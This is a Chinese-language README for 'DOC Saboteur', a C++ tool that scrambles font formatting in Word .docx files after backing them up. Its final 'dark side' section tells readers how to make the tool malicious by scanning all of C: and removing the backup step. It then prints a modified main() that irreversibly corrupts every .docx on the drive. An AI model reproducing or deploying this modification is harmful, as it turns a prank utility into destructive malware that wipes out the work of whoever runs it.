## Switch Language / 切换语言

- [English](README_en.md)
- [简体中文](README.md)
---

# DOC Saboteur (文档破坏者)

## 简介

DOC Saboteur 是一个有趣且实用的工具，专门设计用于随机化Word文档(`*.docx`)的格式属性，包括`字体大小`、`字体颜色`、`字体加粗`和`字体倾斜`。这个工具非常适合需要测试文档处理软件对不同格式容错能力的开发者，或者任何对Word文档格式随机化感兴趣的用户。

## 功能

- **格式属性随机化**：自动扫描程序根目录(或指定目录)下的所有Word文档(`*.docx`)，并对每个文件的文本格式进行随机化处理.
- **文件处理**：
  - **不支持中文文件名**：程序将自动检测中文文件名并重命名为非中文字符串，以保证处理过程无误。
  - **自动备份**：在进行任何修改前，自动将源文件备份到C盘的`doc_saboteur_backup`目录下，确保原数据安全。

## 使用指南

1. 将Word文档(`*.docx`)放入程序根目录下(默认配置)。
2. 运行DOC Saboteur程序。
3. 程序会自动扫描根目录下的所有Word文档，并进行格式随机化处理。
4. 处理完成后，可以在程序根目录下找到被修改的文档。
5. 原始文件将被安全备份到C盘的`doc_saboteur_backup`目录下。

## 注意事项

1. 确保C盘的`doc_saboteur_backup`目录存在且有足够的空间存储备份文件。
2. 程序目前不支持直接处理文件名为中文的文档，但会自动进行重命名处理。
3. 在使用本程序时，请确保你有足够的权限访问和修改指定目录下的文件。

## 代码编译环境
**系统环境**: `Windows10-x64`; `Visual Studio 2022`; `C++17`; 

**所需的库**: `Pugixml`; `libzip`; `zlib`;

## 黑暗面
你只需修改`main()`函数中的两行代码就能使它变成一个非常恶意的程序.
1. 修改`std::vector<std::string> file_list = op.find_docx_files("./");`代码,`op.find_docx_files("./")`中的`"./"`表示程序根目录,你可以将其改为某个盘符,例如`C:/`,这样程序会遍历查找并破坏C盘下的所有的`*.docx`文件.
1. 将`if (op.copy_file(*iter, "C:/doc_saboteur_backup/" + *iter) == true)`注释掉,这行代码的作用是在破坏文档前将其备份到`C:/doc_saboteur_backup/`中,如果注释掉则程序不会备份文档,那么对您的文档的破坏将不可逆!!!

####  以下是一个示例:

```c++
int main() {
    std::cout << "DOC Saboteur - v0.1;\nPowered by RMSHE - 2024.03.15;\n" << std::endl;

    try {
        std::vector<std::string> file_list = op.find_docx_files("C:/");
        for (auto iter = file_list.begin(); iter != file_list.end(); ++iter) {
                std::filesystem::path _docxPath_ = op.renameIfChinese(*iter);

                // 转换为 std::string
                std::string docxPathString = _docxPath_.string();

                // 获取 const char* 类型
                const char *docxPath = docxPathString.c_str();
                const char *docXmlPath = "word/document.xml";

                std::cout << docxPath << std::endl;

                std::string xmlContent = op.readZipFile(docxPath, docXmlPath);

                // 随机化处理
                std::string modifiedXml = randomizeFontPropertiesEnhanced(xmlContent);
                op.writeZipFile(docxPath, docXmlPath, modifiedXml);

                std::cout << "文档处理完成:" + *iter << std::endl;
            }
    } catch (const std::exception &e) {
        std::cerr << "发生错误: " << e.what() << std::endl;

        system("pause");
        return 1;
    }

    system("pause");
    return 0;
}
```

